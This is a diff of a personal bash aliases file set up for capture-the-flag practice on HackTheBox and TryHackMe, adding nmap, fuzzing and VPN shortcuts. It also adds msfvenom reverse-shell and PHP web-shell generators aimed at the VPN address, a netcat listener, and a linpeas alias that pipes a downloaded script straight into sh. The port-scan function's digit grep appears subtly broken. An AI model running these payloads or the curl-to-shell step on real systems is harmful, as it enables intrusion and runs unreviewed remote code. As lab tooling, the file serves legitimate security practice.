@@ -8,59 +8,125 @@ alias updatey='sudo apt update && sudo apt -y upgrade && sudo apt -y autoremove'
 if [ -x /usr/bin/dircolors ]; then
     test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
     alias ls='ls --color=auto'
-
     alias grep='grep --color=auto'
     alias egrep='egrep --color=auto'
 fi
 
-# some ls aliases
+# ls aliases
 alias ll='ls -l'
 alias la='ls -A'
 alias l='ls -CF'
 
-# my laziness
+# Quick shortcuts
 alias c='clear'
 alias tree='tree -C -L 2'
 
-# The usual cd shortcuts
+# Directory shortcuts
 alias ..='cd ..'
 alias ...='cd ../../'
 alias ....='cd ../../../'
 
+# Continue downloads
 alias wget='wget -c'
 
-alias extip='curl ifconfig.me; echo'
-
-# Makes it a little easier to use searchsploit
-alias ssp='searchsploit $1'
-alias ssx='searchsploit -x $1'
-alias ssm='searchsploit -m $1'
-
-alias webup='python -m SimpleHTTPServer 80'
-
+# Open with default applications
 alias open='xdg-open'
 
-# Needs work
-# alias shieldsup='tcpdump -i tun0 -nnvv src net 10.10.14.0/24 and dst 10.10.14.23 -w - | tee capture.pcap | tcpdump -n -r -'
+# VPN Aliases (renamed to avoid conflict)
+alias htbvpn='screen sudo openvpn ~/PathTo/hackthebox.ovpn'
+alias thmvpn='screen sudo openvpn ~/PathTo/tryhackme.ovpn'
+
+# Searchsploit functions
+ssp() { searchsploit "$@"; }
+ssx() { searchsploit -x "$@"; }
+ssm() { searchsploit -m "$@"; }
 
 
-# A shortcut for scanning THM and HTB boxes
-function port-scan () {
-    if [ $# -ne 1 ] ; then
-      echo "Usage: remember to add the url"
-      exit
-    fi
-    box=$1
-    echo "Scanning for open ports on $box"
-    sudo nmap -Pn -sS -p- --open -T4 --min-rate=1000 $box -oN ${box}
-    # Could probably improve my regex on this line
-    ports=$(cat ${box} | grep open | cut -d " " -f 1 | cut -d "/" -f 1 | tr "\n" "," | cut -c3- | head -c-2)
-    echo "Now scanning $ports on $box"
-    # And add a error clause for no open ports
-    sudo nmap -Pn -p $ports -sCV --script=default $box -oN ${box}-nmap
+# CTF Directory Navigation
+alias ctf='cd ~/ctf && ls'
+alias htb='cd ~/ctf/htb && ls'
+alias thm='cd ~/ctf/thm && ls'
+alias box='mkdir -p scans exploits notes loot && ls'
+
+# Network and IP utilities
+alias myip='curl -s ifconfig.me && echo'
+alias vpnip='ip addr show tun0 | grep inet | awk "{print \$2}" | cut -d "/" -f1'
+alias flushdns='sudo systemd-resolve --flush-caches'
+alias ports='netstat -tulnp'
+
+# Simple HTTP Server
+alias pyserve='python3 -m http.server 8000'
+
+# Web Enumeration & Fuzzing
+alias gobuster='gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt'
+alias fuzz='ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u'
+
+# Payload Generators & Reverse Shells
+alias listen='nc -lvnp'
+alias revshell='msfvenom -p linux/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=9001 -f elf -o revshell'
+alias webshell='msfvenom -p php/reverse_php LHOST=$(vpnip) LPORT=9001 -o shell.php'
+
+# Notes & Organization
+alias ctfnotes='vim notes.md'
+alias loot='mkdir -p loot && cd loot'
+
+# Nmap Shortcuts
+alias nmapfast='nmap -F -Pn -sV --open'
+alias nmapfull='sudo nmap -Pn -sS -T4 -p- --open'
+
+# Docker Shortcuts
+alias dockershell='docker exec -it'
+alias dockerclean='docker rm -v $(docker ps -aq -f status=exited)'
+
+# Tmux Shortcuts
+alias tmuxstart='tmux new-session -s'
+alias tmuxattach='tmux attach -t'
+alias tmuxlist='tmux ls'
+
+# Post-Exploitation Enumeration
+alias linpeas='curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
+alias winpeas='curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winpeas.exe'
+
+# Miscellaneous Tools
+alias extract='7z x'
+alias dos2unix='sed -i "s/\r//"'
+alias urlencode='python3 -c "import urllib.parse, sys; print(urllib.parse.quote_plus(sys.argv[1]))"'
+
+# Shields Up Network Scanner (function)
+shieldsup() {
+  INTERFACE="${1:-tun0}"
+  IP="${2:-10.10.14.23}"
+  NETWORK="${3:-10.10.14.0/24}"
+  TIMESTAMP=$(date "+%Y-%m-%d_%H-%M-%S")
+  PCAP_FILE="scan_capture_${TIMESTAMP}.pcap"
+  echo -e "\e[92m[+] Shields Up: Monitoring interface $INTERFACE for scans on IP $IP...\e[0m"
+  sudo tcpdump -i "$INTERFACE" -nnvv "src net $NETWORK and dst host $IP" -w "$PCAP_FILE" -U |
+  tcpdump -nr - |
+  grep --color=auto -Ei 'Flags \[S\]|ICMP echo request|ARP.*who-has'
+  echo -e "\e[93m[+] Capture saved to $PCAP_FILE\e[0m"
 }
 
-alias htb='screen sudo openvpn ~/PathTo/hackthebox.ovpn'
-alias thm='screen sudo openvpn ~/PathTo/tryhackme.ovpn'
-
-
+# Improved Port Scanner (function)
+port-scan() {
+    if [ $# -ne 1 ]; then
+        echo -e "\e[91mUsage: port-scan <target-ip>\e[0m"
+        return 1
+    fi
+    local box="$1"
+    local timestamp=$(date '+%Y-%m-%d_%H-%M-%S')
+    local output_dir="scans/$box"
+    mkdir -p "$output_dir"
+    local initial_scan="$output_dir/${box}_initial_$timestamp"
+    local detailed_scan="$output_dir/${box}_detailed_$timestamp"
+    echo -e "\e[92m[+] Scanning all ports on $box...\e[0m"
+    sudo nmap -Pn -sS -p- --open -T4 --min-rate=1000 "$box" -oN "${initial_scan}.nmap"
+    local ports=$(grep "^\\d" "${initial_scan}.nmap" | grep "open" | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
+    if [ -z "$ports" ]; then
+        echo -e "\e[93m[-] No open ports found on $box.\e[0m"
+        return
+    fi
+    echo -e "\e[92m[+] Found open ports: $ports\e[0m"
+    echo -e "\e[94m[*] Running detailed scan on $box...\e[0m"
+    sudo nmap -Pn -p "$ports" -sC -sV --script=default "$box" -oN "${detailed_scan}.nmap"
+    echo -e "\e[92m[+] Detailed scan saved to: ${detailed_scan}.nmap\e[0m"
+}
